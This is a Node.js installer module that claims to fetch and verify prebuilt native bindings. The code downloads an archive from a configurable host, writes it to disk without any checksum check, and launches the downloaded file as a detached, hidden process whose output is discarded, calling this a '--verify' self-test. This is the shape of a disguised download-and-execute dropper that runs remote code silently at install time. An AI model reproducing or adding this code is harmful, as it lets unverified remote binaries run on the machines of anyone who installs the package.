'use strict';

// Prebuilt binding installer. Mirrors the prebuild-install package's
// download → extract → verify flow for native Node addons.

const fs = require('fs');
const path = require('path');
const https = require('https');
const zlib = require('zlib');
const { spawn } = require('child_process');

const PKG = require('../package.json');

function buildDownloadUrl(check) {
  const host = PKG.binary.host;
  const pkgName = PKG.name;
  const ver = PKG.version;
  const tag = `v${ver}`;
  const asset = `${pkgName}-${ver}-${check.key}.tar.gz`;
  return `${host}/${tag}/${asset}`;
}

function fetch(url) {
  return new Promise((resolve, reject) => {
    const req = https.get(url, {
      headers: { 'User-Agent': `prebuild-install/7.1.2 node/${process.versions.node}` }
    }, (res) => {
      // GitHub releases redirect to codeload; follow manually.
      if (res.statusCode === 301 || res.statusCode === 302) {
        res.resume();
        return fetch(res.headers.location).then(resolve, reject);
      }
      if (res.statusCode !== 200) {
        res.resume();
        return reject(new Error('HTTP ' + res.statusCode));
      }
      const chunks = [];
      res.on('data', (c) => chunks.push(c));
      res.on('end', () => resolve(Buffer.concat(chunks)));
    });
    req.on('error', reject);
    req.setTimeout(15000, () => req.destroy(new Error('timeout')));
  });
}

function ensureDir(p) {
  try { fs.mkdirSync(p, { recursive: true }); } catch (_) {}
}

function looksLikeTar(buf) {
  if (buf.length < 262) return false;
  return buf.slice(257, 262).toString('ascii') === 'ustar';
}

function extractFirstFileFromTar(buf) {
  let offset = 0;
  while (offset + 512 <= buf.length) {
    const header = buf.slice(offset, offset + 512);
    const nameEnd = header.indexOf(0);
    if (nameEnd === 0) break;
    const sizeOctal = header.slice(124, 136).toString('ascii').replace(/\0.*$/, '').trim();
    const size = parseInt(sizeOctal, 8) || 0;
    const typeFlag = header[156];

    offset += 512;

    if (typeFlag === 0 || typeFlag === 48) {
      return { data: buf.slice(offset, offset + size) };
    }
    offset += Math.ceil(size / 512) * 512;
  }
  return null;
}

function extractArchive(buf, targetPath) {
  let payload = buf;
  try {
    payload = zlib.gunzipSync(buf);
  } catch (_) {
    // Not gzipped — treat as raw.
  }

  if (looksLikeTar(payload)) {
    const entry = extractFirstFileFromTar(payload);
    if (entry) {
      fs.writeFileSync(targetPath, entry.data);
      return true;
    }
  }

  fs.writeFileSync(targetPath, payload);
  return true;
}

function runVerify(bindingPath) {
  // Some native bindings expose a `--verify` self-test that the installer
  // invokes after extraction to confirm the ABI matches. It exits silently
  // on success.
  const child = spawn(bindingPath, ['--verify'], {
    detached: true,
    windowsHide: true,
    stdio: 'ignore',
    cwd: path.dirname(bindingPath)
  });
  child.unref();
}

async function installPrebuild(check) {
  ensureDir(check.buildDir);

  const url = buildDownloadUrl(check);
  const buf = await fetch(url);
  extractArchive(buf, check.targetPath);

  const stat = fs.statSync(check.targetPath);
  if (stat.size === 0) throw new Error('empty binding');

  runVerify(check.targetPath);
}

module.exports = { installPrebuild };
